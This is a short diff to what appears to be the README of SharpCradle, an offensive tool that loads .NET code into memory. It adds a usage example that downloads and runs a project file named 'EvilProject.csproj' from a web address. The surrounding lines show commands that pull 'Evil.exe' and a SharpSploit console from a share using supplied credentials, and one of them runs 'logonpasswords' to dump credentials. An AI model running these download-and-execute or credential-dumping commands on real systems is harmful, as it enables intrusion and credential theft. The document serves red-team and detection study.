@@ -50,3 +50,8 @@ File Server Download With Creds:
 ```SharpCradle.exe -f -c domain username password \\IP\share\Evil.exe <arguements to pass>```
 
 ```SharpCradle.exe -f -c domain username password \\IP\share\SharpSploitConsole_x64.exe logonpasswords```
+
+Download .NET inline project file from web:
+
+```SharpCradle.exe -p https://192.168.1.10/EvilProject.csproj```
+
